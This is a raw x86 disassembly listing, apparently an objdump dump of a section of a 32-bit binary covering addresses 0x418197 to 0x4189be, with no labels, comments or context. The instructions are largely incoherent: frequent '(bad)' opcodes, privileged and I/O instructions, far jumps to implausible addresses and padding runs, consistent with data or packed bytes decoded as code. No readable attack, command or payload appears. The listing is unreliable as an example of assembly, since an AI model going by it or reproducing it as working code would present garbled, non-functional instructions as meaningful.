  418197:	sub    eax,0xe8a842fc
  41819c:	(bad)  
  41819e:	sbb    dh,BYTE PTR [ebp+eax*8+0x76]
  4181a2:	fisub  DWORD PTR [ebp+0x1cc336fd]
  4181a8:	mov    edi,0x3280b5a
  4181ad:	jne    0x418130
  4181af:	and    al,0xf8
  4181b1:	bound  esi,QWORD PTR [ecx+0xee644c3]
  4181b7:	push   0xffffff9e
  4181b9:	dec    ebp
  4181ba:	cmp    al,0x8e
  4181bc:	inc    esp
  4181bd:	jne    0x41814e
  4181bf:	ins    BYTE PTR es:[edi],dx
  4181c0:	dec    ebx
  4181c1:	inc    ebx
  4181c2:	cmp    eax,0xe2c95b7e
  4181c7:	jmp    edi
  4181c9:	jbe    0x418243
  4181cb:	add    bl,ch
  4181cd:	jbe    0x4181d1
  4181cf:	mov    ebp,DWORD PTR [esi+ebp*4+0x3c]
  4181d3:	std    
  4181d4:	pop    esi
  4181d5:	mov    esi,0x76e82068
  4181da:	jb     0x4181db
  4181dc:	lods   eax,DWORD PTR ds:[esi]
  4181dd:	rol    BYTE PTR [ebx-0x3e],1
  4181e0:	icebp  
  4181e1:	jbe    0x4181b4
  4181e3:	mov    BYTE PTR [ebp-0x9],cl
  4181e6:	sub    eax,0x276ea1c
  4181eb:	push   ecx
  4181ec:	xchg   edi,eax
  4181ed:	div    DWORD PTR [eax+eax*1]
  4181f0:	jmp    0x418268
  4181f2:	add    dh,BYTE PTR [edx-0x71]
  4181f5:	add    BYTE PTR [eax],al
  4181f7:	add    BYTE PTR [eax],al
  4181f9:	add    BYTE PTR [ebx-0x72],ah
  4181fc:	or     cl,ch
  4181fe:	cmp    BYTE PTR [edi],bh
  418200:	std    
  418201:	bound  esp,QWORD PTR [esi]
  418203:	test   DWORD PTR [ebx-0x3],ecx
  418206:	jp     0x418285
  418208:	jne    0x4181a9
  41820a:	cmc    
  41820b:	mov    eax,0x42de907
  418210:	xchg   DWORD PTR [esi+edi*1-0x2319da4a],esp
  418217:	add    al,0x81
  418219:	test   BYTE PTR [ecx+0x3c],cl
  41821c:	std    
  41821d:	(bad)  
  41821e:	jns    0x4181a9
  418220:	add    ecx,0x37
  418223:	aas    
  418224:	std    
  418225:	shr    DWORD PTR [eax-0x1e],1
  418228:	(bad)  
  418229:	call   0x649b82f6
  41822e:	inc    esp
  41822f:	xor    al,0x8b
  418231:	fs cdq 
  418233:	cmp    al,0xfd
  418235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418236:	xchg   ecx,eax
  418237:	lds    ebx,FWORD PTR [esi]
  418239:	call   0x91bc3db4
  41823e:	cmp    eax,0xc2455fd
  418243:	push   ds
  418244:	std    
  418245:	add    BYTE PTR [ecx+0x8],al
  418248:	mov    DWORD PTR [ebp-0x44],eax
  41824b:	push   esi
  41824c:	push   ebx
  41824d:	(bad)  
  41824e:	leave  
  41824f:	jmp    0xf040:0xc79bfffb
  418256:	or     al,0x6
  418258:	add    BYTE PTR [eax],al
  41825a:	les    esp,FWORD PTR [edi-0x5]
  41825d:	inc    DWORD PTR [eax]
  41825f:	add    BYTE PTR [eax],al
  418261:	add    BYTE PTR [eax],al
  418263:	stos   DWORD PTR es:[edi],eax
  418264:	mov    al,al
  418266:	jne    0x418292
  418268:	dec    edx
  418269:	cmp    BYTE PTR [ebp+0x40],dh
  41826c:	js     0x41820d
  41826e:	xor    ecx,DWORD PTR [eax+eiz*1+0x58]
  418272:	leave  
  418273:	sahf   
  418274:	or     al,BYTE PTR [eax]
  418276:	mov    edx,DWORD PTR [edx+0x6755f5eb]
  41827c:	bnd jle 0x41826b
  41827f:	enter  0x418c,0xc
  418283:	adc    cl,BYTE PTR [ebp+0x5a573c6f]
  418289:	sbb    esi,DWORD PTR [ebx+eiz*8]
  41828c:	mov    WORD PTR [ecx+0x8],?
  41828f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418290:	cld    
  418291:	inc    dh
  418293:	or     al,0x59
  418295:	push   eax
  418296:	mov    edx,DWORD PTR [edi-0x73]
  418299:	inc    ecx
  41829a:	hlt    
  41829b:	(bad)  
  41829c:	sar    BYTE PTR [eax-0x1],1
  41829f:	mov    ebx,0x4cf84192
  4182a4:	ins    BYTE PTR es:[edi],dx
  4182a5:	cmp    eax,0xfb1221ff
  4182aa:	jne    0x418230
  4182ac:	rcl    BYTE PTR [eax],0x14
  4182af:	popf   
  4182b0:	aas    
  4182b1:	std    
  4182b2:	test   BYTE PTR [ebx+esi*2],bl
  4182b5:	cmp    esi,DWORD PTR [ebx]
  4182b7:	adc    eax,0x55ff4987
  4182bc:	push   edx
  4182bd:	or     DWORD PTR [esi+0x2d],esi
  4182c0:	adc    BYTE PTR [esi-0x716b8aab],dh
  4182c6:	inc    ebx
  4182c7:	add    BYTE PTR [eax],al
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	add    BYTE PTR [ebp-0x61],bh
  4182ce:	aam    0x12
  4182d0:	gs jns 0x4182e8
  4182d3:	or     BYTE PTR [ebx],bh
  4182d5:	out    0x40,al
  4182d7:	xor    BYTE PTR [eax+0x717304b4],0x63
  4182de:	enter  0x75fc,0x6a
  4182e2:	dec    BYTE PTR [edx+0x69]
  4182e5:	push   edi
  4182e6:	bound  ecx,QWORD PTR [ebx-0x32f2e48]
  4182ec:	adc    cl,0x41
  4182ef:	jae    0x418362
  4182f1:	les    esi,FWORD PTR [edi+0x1555fa07]
  4182f7:	sysexit 
  4182f9:	sub    DWORD PTR [edx+0x73],eax
  4182fc:	loope  0x41829d
  4182fe:	push   ebp
  4182ff:	push   ebp
  418300:	loop   0x41829e
  418302:	pop    ds
  418303:	xor    al,0xee
  418305:	out    dx,eax
  418306:	sub    BYTE PTR [edx+0x50],ch
  418309:	adc    al,0x42
  41830b:	pop    ebp
  41830c:	sub    esp,edx
  41830e:	inc    edx
  41830f:	or     al,0x75
  418311:	cwde   
  418312:	nop
  418313:	dec    eax
  418314:	(bad)  
  418315:	xchg   edx,eax
  418316:	fiadd  DWORD PTR [eax+0x4dba2aac]
  41831c:	xor    si,sp
  41831f:	fdiv   st,st(0)
  418321:	lock ds jmp 0x24093373
  418328:	gs lahf 
  41832a:	pop    es
  41832b:	call   FWORD PTR [esi+0x19]
  41832e:	add    BYTE PTR [edi],al
  418330:	add    BYTE PTR [eax],al
  418332:	add    BYTE PTR [eax],al
  418334:	add    BYTE PTR [edx],cl
  418336:	add    DWORD PTR [eax+0x35501d9],ecx
  41833c:	shl    BYTE PTR [ecx+0x7a0bbf22],0xa9
  418343:	inc    ebx
  418344:	xchg   edi,eax
  418345:	iret   
  418346:	add    dh,cl
  418348:	loopne 0x4183ab
  41834a:	cmp    ch,BYTE PTR [esi+eax*8+0x53]
  41834e:	xchg   BYTE PTR [edx-0x21bcf4ef],dh
  418354:	xchg   edi,eax
  418355:	xor    al,0x6
  418357:	ja     0x418324
  418359:	cmc    
  41835a:	cmp    edi,DWORD PTR [esi-0x3f]
  41835d:	aas    
  41835e:	neg    BYTE PTR [eax-0x5a728352]
  418364:	fld    TBYTE PTR [ecx]
  418366:	xor    al,0x72
  418368:	inc    esi
  418369:	and    BYTE PTR [ebx+0x2],bl
  41836c:	inc    esp
  41836d:	mov    ch,0x2d
  41836f:	jmp    0xad1b4e69
  418374:	fdiv   QWORD PTR [edi+edi*8]
  418377:	out    0xad,al
  418379:	push   0xffffffdb
  41837b:	add    DWORD PTR [ebx+0x64],eax
  41837e:	add    eax,0xd5b443fa
  418383:	pop    ebx
  418384:	and    BYTE PTR [eax-0x74],bh
  418387:	out    dx,al
  418388:	jmp    DWORD PTR [ebp-0x79100f52]
  41838e:	imul   al
  418390:	mov    ecx,0xdd26f570
  418395:	mov    ch,0x73
  418397:	neg    cl
  418399:	add    BYTE PTR [eax],al
  41839b:	add    BYTE PTR [eax],al
  41839d:	add    bh,ch
  41839f:	mov    cl,0xe7
  4183a1:	sub    al,0x7c
  4183a3:	mov    ebp,gs
  4183a5:	call   FWORD PTR [edx-0x4c]
  4183a8:	(bad)  
  4183aa:	imul   esi,DWORD PTR [ecx+0x355dc9eb],0x59
  4183b1:	xor    ecx,DWORD PTR [ebp+esi*1+0x5b]
  4183b5:	fisttp DWORD PTR [edx]
  4183b7:	clc    
  4183b8:	sub    al,0xb7
  4183ba:	or     DWORD PTR es:[ebp+0x42],edi
  4183be:	in     al,dx
  4183bf:	dec    eax
  4183c0:	adc    dl,BYTE PTR [ecx-0x54]
  4183c3:	dec    edx
  4183c4:	add    BYTE PTR [esi+edi*1],bh
  4183c7:	into   
  4183c8:	out    0x19,eax
  4183ca:	mov    ah,0x37
  4183cc:	std    
  4183cd:	ins    DWORD PTR es:[edi],dx
  4183ce:	mov    dh,0xae
  4183d0:	cmp    al,0x27
  4183d2:	add    BYTE PTR [eax-0x17],al
  4183d5:	out    dx,eax
  4183d6:	div    bh
  4183d8:	pop    ebp
  4183d9:	adc    eax,0x7a38c07a
  4183de:	add    BYTE PTR [edi],ch
  4183e0:	cmp    DWORD PTR [edx-0x16],edi
  4183e3:	in     al,dx
  4183e4:	mov    BYTE PTR [edi+0x70814119],ah
  4183ea:	js     0x4183a0
  4183ec:	and    BYTE PTR [edi-0xd16b817],ch
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	cmp    al,0x19
  4183f6:	ret    
  4183f7:	(bad)  
  4183f8:	cmp    edx,DWORD PTR [eax]
  4183fa:	mov    esp,0x40024603
  4183ff:	mov    ah,0xee
  418401:	jb     0x418403
  418403:	add    BYTE PTR [eax],al
  418405:	add    BYTE PTR [eax],al
  418407:	cmp    al,0xeb
  418409:	mov    esi,0x71feae6a
  41840e:	out    0xf1,eax
  418410:	aas    
  418411:	sub    DWORD PTR [esi],ebp
  418413:	mov    DWORD PTR [ecx+esi*1],eax
  418416:	sub    esp,edx
  418418:	fld    st(0)
  41841a:	mov    esp,0xfd8125f9
  41841f:	retf   
  418420:	rcl    DWORD PTR [ebp+0x72],1
  418423:	xchg   BYTE PTR [ebx+0x7fcdf143],cl
  418429:	inc    ebx
  41842a:	icebp  
  41842b:	pop    esi
  41842c:	push   cs
  41842d:	mov    DWORD PTR [esi+ebx*2-0x75],ebp
  418431:	(bad)  
  418432:	rol    ebp,1
  418434:	xor    eax,0x59fedefd
  418439:	xor    DWORD PTR [edx+0x24fd12cc],0x41
  418440:	enter  0x80,0xb2
  418444:	or     eax,0xc46fe773
  418449:	pop    edx
  41844a:	pop    esi
  41844b:	xchg   ebp,eax
  41844d:	ror    DWORD PTR [eax],0x4c
  418450:	sub    eax,0x129180f0
  418455:	add    BYTE PTR [ecx-0x37483d97],cl
  41845b:	pop    esp
  41845c:	add    al,0x0
  41845e:	jne    0x4184b8
  418460:	cmp    eax,0x8bef72ed
  418465:	dec    ecx
  418466:	clc    
  418467:	lahf   
  418468:	imul   ecx,DWORD PTR [ecx],0x0
  41846e:	add    BYTE PTR [eax],al
  418470:	xchg   ecx,eax
  418471:	cmp    cl,BYTE PTR [eax]
  418473:	cmp    DWORD PTR [ecx-0x3e],ebx
  418476:	jno    0x41847b
  418478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418479:	dec    ecx
  41847a:	stc    
  41847b:	xor    DWORD PTR [ecx],0xfffffff8
  41847e:	push   DWORD PTR [ebp+0x3]
  418481:	lea    ecx,[ecx+0xc]
  418484:	xchg   edi,eax
  418485:	dec    ecx
  418486:	stc    
  418487:	sub    ecx,DWORD PTR [ebp-0x6f]
  41848a:	cmp    al,0x31
  41848c:	inc    esp
  41848d:	idiv   ch
  41848f:	jmp    DWORD PTR [ebx-0x288a3f77]
  418495:	clc    
  418496:	inc    eax
  418497:	or     al,0x67
  418499:	dec    ecx
  41849a:	or     DWORD PTR [ebx],edi
  41849c:	sbb    eax,edi
  41849e:	jno    0x418481
  4184a0:	arpl   WORD PTR [ecx+0x9],di
  4184a3:	push   esi
  4184a4:	je     0x418448
  4184a6:	mov    al,ds:0x70f8cc00
  4184ab:	clc    
  4184ac:	daa    
  4184ad:	test   BYTE PTR [esi+0x397474c3],0xff
  4184b4:	xchg   ebx,eax
  4184b5:	imul   eax,DWORD PTR [ebx],0x88c24989
  4184bb:	jne    0x41849d
  4184bd:	pop    ebx
  4184be:	in     eax,0x94
  4184c0:	jne    0x4184fb
  4184c2:	add    al,0x0
  4184c4:	inc    esi
  4184c5:	jnp    0x418540
  4184c7:	xor    BYTE PTR [eax],al
  4184c9:	jmp    0x47f0dd1
  4184ce:	cmp    cl,BYTE PTR ds:0x52fc60b0
  4184d4:	add    BYTE PTR [eax],al
  4184d6:	add    BYTE PTR [eax],al
  4184d8:	add    BYTE PTR [ecx+0x1a],ah
  4184db:	or     eax,0xd15db043
  4184e0:	mov    BYTE PTR [ebx],bh
  4184e2:	stc    
  4184e3:	rcl    DWORD PTR [ecx-0x23],1
  4184e6:	arpl   WORD PTR [ecx],ax
  4184e8:	add    BYTE PTR [ebp-0x7f],dh
  4184eb:	vpcmpeqw ymm5,ymm1,YMMWORD PTR [ecx]
  4184ef:	add    ah,0x8d
  4184f2:	adc    BYTE PTR [esp+edx*2],ch
  4184f5:	gs mov al,0x3d
  4184f8:	std    
  4184f9:	test   al,0xa5
  4184fb:	sub    BYTE PTR [ebp+eiz*2-0x60],cl
  4184ff:	cmp    eax,0xea25b889
  418504:	inc    edx
  418505:	jge    0x418533
  418507:	inc    edx
  418508:	add    DWORD PTR [eax-0x5bbd42f],edi
  41850e:	mov    edi,0x353a893d
  418513:	rcl    BYTE PTR [ebp-0x2],cl
  418516:	je     0x418511
  418518:	ja     0x418590
  41851a:	lock icebp 
  41851c:	fcomp  DWORD PTR [edi+edi*1-0x596689e7]
  418523:	add    al,0x9d
  418525:	jbe    0x41858e
  418527:	loope  0x41859c
  418529:	imul   esp,DWORD PTR [eax+ecx*1-0x4b004596],0x23
  418531:	test   DWORD PTR [esi+ecx*2],ebp
  418534:	cmp    DWORD PTR [ebp+0x34b52a2f],0x833b28
  41853e:	add    BYTE PTR [eax],al
  418540:	add    BYTE PTR [eax],al
  418542:	mov    ch,0x1
  418544:	pop    ebx
  418545:	sysenter 
  418547:	sti    
  418548:	cmp    al,0x1c
  41854a:	pop    es
  41854b:	push   esi
  41854c:	sbb    al,BYTE PTR [ebx+eiz*1-0x25]
  418550:	test   al,0x8
  418552:	jne    0x4184df
  418554:	sub    eax,0xdac4fde8
  418559:	mov    ?,WORD PTR [ecx-0x26]
  41855c:	in     eax,0x74
  41855e:	jns    0x41855a
  418560:	pop    ebx
  418561:	or     dl,bl
  418563:	mov    ebx,ebp
  418565:	sti    
  418566:	jne    0x4185a5
  418568:	xchg   edx,eax
  418569:	sub    BYTE PTR [esi+0x77e98389],ah
  41856f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418570:	fwait
  418571:	sar    DWORD PTR [edx],0xd1
  418574:	sbb    al,0x89
  418576:	data16 cmp bl,cl
  418579:	ret    
  41857a:	sub    cl,ch
  41857c:	add    BYTE PTR [edx],al
  41857e:	fs xor eax,0x5aedd516
  418584:	je     0x41854d
  418586:	adc    dl,0x5d
  418589:	mov    bh,0x72
  41858b:	xor    eax,0x358f13dc
  418590:	dec    esi
  418591:	push   esi
  418592:	test   BYTE PTR [edx-0x45],0xe9
  418596:	jne    0x41856f
  418598:	jmp    0x72c7:0x63fe5cd4
  41859f:	rcr    BYTE PTR [ecx+0x260a663c],cl
  4185a5:	pop    ss
  4185a6:	add    BYTE PTR [eax],al
  4185a8:	add    BYTE PTR [eax],al
  4185aa:	add    BYTE PTR [ecx+0x10],al
  4185ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185ae:	add    esi,esi
  4185b0:	inc    edx
  4185b1:	fwait
  4185b2:	pop    es
  4185b3:	add    eax,0x4f140204
  4185b8:	add    ebx,DWORD PTR [esi-0x232b62c]
  4185be:	mov    dh,0x7a
  4185c0:	xor    eax,0x376e7c00
  4185c5:	(bad)  
  4185c6:	mov    ebx,0x425dd736
  4185cb:	mov    dl,0x43
  4185cd:	or     al,0xe9
  4185cf:	mov    al,ds:0xec4dfbce
  4185d4:	adc    DWORD PTR [eax],esi
  4185d6:	jmp    0x1bca8851
  4185db:	test   DWORD PTR [ebx-0x50022aae],ecx
  4185e1:	daa    
  4185e2:	jo     0x418662
  4185e4:	add    al,BYTE PTR [eax]
  4185e6:	jmp    0xa972bc50
  4185eb:	loop   0x4185e3
  4185ed:	pop    esi
  4185ee:	sbb    eax,0xa81fe677
  4185f3:	mov    cl,0x9
  4185f5:	add    DWORD PTR [ecx-0x7980cd6c],edx
  4185fb:	dec    ebp
  4185fc:	jns    0x418648
  4185fe:	adc    edi,esp
  418600:	mov    edi,0xb184620f
  418605:	(bad)  
  418606:	push   cs
  418607:	cmp    eax,DWORD PTR [edx+0x53]
  41860a:	jb     0x41866e
  41860c:	sub    esp,0xfffffff5
  41860f:	add    BYTE PTR [eax],al
  418611:	add    BYTE PTR [eax],al
  418613:	add    BYTE PTR [esi+0x7b],bl
  418616:	std    
  418617:	push   esi
  418618:	inc    ecx
  418619:	arpl   WORD PTR [eax+0x1c],si
  41861c:	xor    eax,0x2b298435
  418621:	(bad)  
  418622:	xor    DWORD PTR [ecx],ebp
  418624:	lahf   
  418625:	or     edi,edi
  418627:	call   0xe184b2a2
  41862c:	ja     0x418601
  41862e:	mov    BYTE PTR [edi*1-0x5e16bff0],al
  418635:	scas   eax,DWORD PTR es:[edi]
  418636:	or     al,BYTE PTR [ebx+0x4ad13776]
  41863c:	or     cl,BYTE PTR [eax+0x41]
  41863f:	add    BYTE PTR [ebx+edi*2+0x68c7ebc0],bl
  418646:	fnsave [ebp-0x34]
  418649:	add    BYTE PTR [edi-0x22f8b08],al
  41864f:	call   FWORD PTR [ebx-0x268fc67c]
  418655:	cmp    al,0xfd
  418657:	dec    edi
  418658:	xor    al,0xee
  41865a:	jo     0x41869c
  41865c:	mov    eax,gs
  41865e:	mov    edi,0x86f83bfe
  418663:	or     eax,0x3ec9b8
  418668:	jl     0x418650
  41866a:	mov    ecx,0x83f80b7b
  41866f:	shl    BYTE PTR [ecx-0x1],0x31
  418673:	shl    ch,0xb4
  418676:	(bad)  
  418677:	inc    DWORD PTR [eax]
  418679:	add    BYTE PTR [eax],al
  41867b:	add    BYTE PTR [eax],al
  41867d:	dec    esp
  41867e:	push   edx
  41867f:	mov    dh,BYTE PTR [ebp-0x48]
  418682:	mov    dh,0xbd
  418684:	add    BYTE PTR [eax+eax*1],bl
  418687:	call   0x40a174
  41868c:	mov    dl,dl
  41868e:	dec    esi
  41868f:	cld    
  418690:	rcr    edi,cl
  418692:	clc    
  418693:	sahf   
  418694:	je     0x4186df
  418696:	cmp    edi,ebp
  418698:	cmp    dl,BYTE PTR [ebx+0x7]
  41869b:	test   BYTE PTR [ebp-0x74fffff4],dl
  4186a1:	popa   
  4186a2:	mov    esi,0x67dc4011
  4186a7:	std    
  4186a8:	jne    0x4186c6
  4186aa:	add    BYTE PTR [eax-0x1],dl
  4186ad:	and    BYTE PTR [esi+0xd],0x76
  4186b1:	or     al,0x0
  4186b3:	sti    
  4186b4:	xor    eax,0x3ecaf0
  4186b9:	aas    
  4186ba:	jbe    0x418686
  4186bc:	inc    ebx
  4186bd:	jne    0x4186e8
  4186bf:	cmp    dl,dh
  4186c1:	dec    ebp
  4186c2:	cmp    eax,0xfc753faf
  4186c7:	out    dx,al
  4186c8:	jae    0x418682
  4186ca:	push   0xde21a101
  4186cf:	(bad)  
  4186d0:	call   FWORD PTR [ebx+0xb3fac0b]
  4186d6:	jmp    0xcd8283de
  4186db:	inc    esi
  4186dc:	inc    ecx
  4186dd:	jne    0x418667
  4186df:	or     ebx,0x0
  4186e5:	add    BYTE PTR [esi],dh
  4186e7:	sub    DWORD PTR [edx],edi
  4186e9:	(bad)  
  4186ea:	fst    QWORD PTR ds:0x74753fb2
  4186f0:	lock jae 0x418723
  4186f3:	call   0x963327fb
  4186f8:	(bad)  
  4186f9:	call   DWORD PTR [ebx+0x73]
  4186fc:	test   eax,0x3e9c35f
  418701:	std    
  418702:	mov    BYTE PTR ds:0xc8754147,dl
  418708:	mov    bl,cl
  41870a:	mov    dh,0x29
  41870c:	cmp    dl,dh
  41870e:	(bad)  
  41870f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418710:	inc    edi
  418711:	inc    ecx
  418712:	jne    0x418786
  418714:	clc    
  418715:	ja     0x41873f
  418717:	call   0xe2befa1f
  41871c:	idiv   BYTE PTR [ebx+0x38]
  41871f:	push   0x125d7401
  418724:	idiv   DWORD PTR [edi+0x28]
  418727:	push   0x2857401
  41872c:	test   DWORD PTR [edi+0x740167b8],0x7442306d
  418736:	jno    0x4186f1
  418738:	add    ebp,ecx
  41873a:	ja     0x41873e
  41873c:	fld    DWORD PTR [ebx+0x2b]
  41873f:	rol    ecx,cl
  418741:	dec    esp
  418742:	mov    bh,0xfd
  418744:	out    0xd6,al
  418746:	in     eax,dx
  418747:	pop    ecx
  418748:	push   0x26
  41874a:	add    BYTE PTR [eax],al
  41874c:	add    BYTE PTR [eax],al
  41874e:	add    BYTE PTR [edx-0x7d42953],dh
  418754:	test   al,0xe6
  418756:	add    edi,ecx
  418758:	inc    ecx
  418759:	jnp    0x41875d
  41875b:	hlt    
  41875c:	add    al,0x8f
  41875e:	dec    eax
  41875f:	xor    al,0x2
  418761:	call   0x7bb4a937
  418766:	inc    edi
  418767:	xor    al,0x2
  418769:	xchg   ebp,eax
  41876a:	xchg   esp,eax
  41876b:	scas   al,BYTE PTR es:[edi]
  41876c:	mov    esi,0x85382be6
  418771:	out    0x3,eax
  418773:	enter  0x7765,0x47
  418777:	mov    ah,0x2
  418779:	adc    eax,0xe2b8357f
  41877e:	cmc    
  41877f:	adc    cl,dh
  418781:	test   eax,0xf0b82c7f
  418786:	stos   DWORD PTR es:[edi],eax
  418787:	xor    dl,BYTE PTR [edx+ebp*1+0x4]
  41878b:	dec    ebp
  41878c:	rol    BYTE PTR [eax-0x72e58afc],0xdd
  418793:	sub    dh,BYTE PTR [edx]
  418795:	mov    ebx,0x7f27a705
  41879a:	xchg   ebx,eax
  41879b:	lea    eax,[edx]
  41879d:	out    0x65,eax
  41879f:	cmp    eax,0xf103aa54
  4187a4:	inc    edx
  4187a5:	aam    0x13
  4187a7:	or     eax,0x7503b242
  4187ac:	out    dx,al
  4187ad:	loop   0x418763
  4187af:	shl    BYTE PTR [edx-0x17],0x65
  4187b3:	add    BYTE PTR [eax],al
  4187b5:	add    BYTE PTR [eax],al
  4187b7:	add    BYTE PTR [ebp-0x9fc55ad],bh
  4187bd:	dec    ebp
  4187be:	add    BYTE PTR [edx+ebx*8+0x4dbb01ed],bh
  4187c5:	jb     0x4187c6
  4187c7:	shl    DWORD PTR [ecx],0x9a
  4187ca:	addr16 sub al,0xb8
  4187cd:	xor    DWORD PTR [edi+0x16],esp
  4187d0:	mov    ebx,esp
  4187d2:	fs jmp 0x349deb4e
  4187d8:	mov    al,0x31
  4187da:	test   BYTE PTR [ecx],ch
  4187dc:	in     eax,0xe6
  4187de:	push   esp
  4187df:	mul    BYTE PTR [esi+0x6969132e]
  4187e5:	ret    0x38ff
  4187e8:	adc    BYTE PTR [edx-0x6e86d536],ah
  4187ee:	pop    esp
  4187ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f0:	mov    cl,0x31
  4187f2:	(bad)  
  4187f3:	sbb    esp,ebp
  4187f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187f6:	retf   0x712a
  4187f9:	pushf  
  4187fa:	add    DWORD PTR [ecx],esp
  4187fc:	xchg   ecx,eax
  4187fd:	add    BYTE PTR [ecx],bh
  4187ff:	call   0xe40fa7a
  418804:	mov    eax,0x3baabff4
  418809:	jp     0x4187f7
  41880b:	push   0xe901fa9a
  418810:	jbe    0x41884a
  418812:	inc    ebx
  418813:	loope  0x41888c
  418815:	mov    ch,0x23
  418817:	adc    DWORD PTR [ecx+0xe9413d],ebp
  41881d:	add    BYTE PTR [eax],al
  41881f:	add    BYTE PTR [eax],al
  418821:	shl    BYTE PTR [eax],1
  418823:	in     eax,0x30
  418825:	or     al,0x2e
  418827:	std    
  418828:	gs mov dh,0xb5
  41882b:	add    ebx,DWORD PTR [ebx]
  41882d:	mov    cl,0x1b
  41882f:	cmp    dl,cl
  418831:	mov    dh,0x3f
  418833:	inc    ecx
  418834:	jmp    0x85298b01
  418839:	fsubr  QWORD PTR ds:0xc55800fd
  41883f:	jae    0x41882d
  418841:	les    esi,FWORD PTR [eax]
  418843:	(bad)  
  418844:	dec    esp
  418846:	xchg   DWORD PTR [ecx-0x5155e08],eax
  41884c:	push   eax
  41884d:	out    0x4,al
  41884f:	sti    
  418850:	adc    eax,0x40169c
  418855:	push   ecx
  418856:	mov    al,bh
  418858:	std    
  418859:	sub    edx,0x4c
  41885c:	call   0x3db593
  418861:	sbb    ebp,eax
  418863:	sahf   
  418864:	mov    ah,0x51
  418866:	inc    esi
  418867:	std    
  418868:	push   cs
  418869:	sub    ebp,eax
  41886b:	(bad)
  41886f:	push   ecx
  418870:	mov    esi,DWORD PTR [eax-0x7767137a]
  418876:	add    al,0x0
  418878:	neg    BYTE PTR [ecx-0x75ad0302]
  41887e:	aas    
  41887f:	or     al,0x84
  418881:	fiadd  DWORD PTR [esi]
  418883:	add    BYTE PTR [eax],al
  418885:	add    BYTE PTR [eax],al
  418887:	add    BYTE PTR [eax],al
  418889:	add    ah,cl
  41888b:	sub    ebp,eax
  41888d:	rcr    DWORD PTR [edi-0x25f102fa],1
  418893:	jp     0x418895
  418895:	add    BYTE PTR [ebp+esi*1-0x28],cl
  418899:	xor    esp,ebx
  41889b:	nop
  41889c:	mov    BYTE PTR [edi+0x3d5b2c],al
  4188a2:	mov    eax,ds:0xa3fb67b1
  4188a7:	mul    edi
  4188a9:	in     al,0x10
  4188ab:	pop    es
  4188ac:	add    BYTE PTR [ebp-0x71167],cl
  4188b2:	xchg   ebx,eax
  4188b3:	push   esi
  4188b4:	xor    al,al
  4188b6:	mov    esp,0x75b7fc53
  4188bb:	xor    DWORD PTR [eax+0x3669753f],ebp
  4188c1:	adc    ecx,DWORD PTR [ebp+0x4c]
  4188c4:	sar    edi,0xf9
  4188c7:	fldcw  WORD PTR [esi-0x2c2011d8]
  4188cd:	mov    bh,al
  4188cf:	icebp  
  4188d0:	ss std 
  4188d2:	retf   0xd169
  4188d5:	out    0x87,eax
  4188d7:	inc    eax
  4188d8:	ss std 
  4188da:	lock fldcw WORD PTR [edi+0x6d56b214]
  4188e1:	retf   
  4188e2:	sbb    DWORD PTR ss:[eax+0x362e9d83],ecx
  4188e9:	std    
  4188ea:	inc    ebp
  4188eb:	cmp    BYTE PTR [eax],dl
  4188ed:	sub    BYTE PTR [eax],al
  4188ef:	add    BYTE PTR [eax],al
  4188f1:	add    BYTE PTR [eax],al
  4188f3:	fs pop ecx
  4188f5:	add    DWORD PTR [ebx-0x7ef7324b],eax
  4188fb:	mov    edx,0x7a80c21d
  418900:	in     eax,dx
  418901:	mov    cl,0x9d
  418903:	pop    esi
  418904:	add    eax,0xb479d8a9
  418909:	adc    DWORD PTR [eax+edx*8],0x700703d9
  418910:	adc    DWORD PTR [edi+0x41],eax
  418913:	jne    0x418959
  418915:	adc    dh,dh
  418917:	jo     0x4188da
  418919:	inc    esi
  41891a:	inc    ecx
  41891b:	jne    0x418937
  41891d:	lods   eax,DWORD PTR ds:[esi]
  41891e:	or     esp,esi
  418920:	and    eax,0x19b6cad9
  418925:	and    DWORD PTR ds:0x5dd61975,ecx
  41892b:	in     eax,0x19
  41892d:	fcmovb st,st(6)
  41892f:	aaa    
  418930:	sbb    eax,0xacfe5301
  418935:	sub    esp,0x61
  418938:	add    ch,ch
  41893a:	add    esi,DWORD PTR [ebp-0x2d]
  41893d:	mov    ah,0xce
  41893f:	in     eax,dx
  418940:	in     al,dx
  418941:	repnz adc dh,BYTE PTR ds:0xd127bf02
  418948:	ret    0x36e6
  41894b:	enter  0x21f2,0xa9
  41894f:	jp     0x418944
  418951:	rcl    BYTE PTR es:[eax],cl
  418954:	push   esi
  418955:	sbb    eax,edx
  418957:	add    BYTE PTR [eax],al
  418959:	add    BYTE PTR [eax],al
  41895b:	add    dl,cl
  41895d:	aam    0x6f
  41895f:	sbb    ch,dl
  418961:	and    eax,0x635303aa
  418966:	call   FWORD PTR [esi]
  418968:	xor    al,0x2
  41896a:	test   DWORD PTR [edx-0x6f],esp
  41896d:	and    eax,0xcfa03aa
  418972:	sbb    ebx,DWORD PTR [edi]
  418974:	xor    al,0x2
  418976:	test   BYTE PTR [edi],0x35
  418979:	sbb    BYTE PTR [edi-0xcba0bfd],ah
  41897f:	int    0x81
  418981:	push   esi
  418982:	ins    BYTE PTR es:[edi],dx
  418983:	outs   dx,DWORD PTR ds:[esi]
  418984:	mov    DWORD PTR [eax],ebp
  418986:	(bad)  
  418987:	xor    eax,0x35ae765d
  41898c:	push   0x15b8277a
  418991:	(bad)  
  418992:	mov    cl,0xc1
  418994:	pop    edx
  418995:	imul   eax,ebp,0x3
  418998:	jne    0x41899c
  41899a:	bound  edi,QWORD PTR [esi]
  41899c:	std    
  41899d:	or     ah,BYTE PTR [edi]
  41899f:	retf   
  4189a0:	(bad)  
  4189a1:	sub    BYTE PTR [edi+ebp*2+0x1f],ch
  4189a5:	sub    dl,BYTE PTR [esi-0x5169e2cb]
  4189ab:	xor    eax,0x3390828
  4189b0:	jne    0x4189b4
  4189b2:	adc    DWORD PTR [eax],edx
  4189b4:	(bad)
  4189b7:	arpl   dx,sp
  4189b9:	cmp    eax,0x1a40a181
  4189be:	mov    DWORD PTR [eax+eax*1],ebx
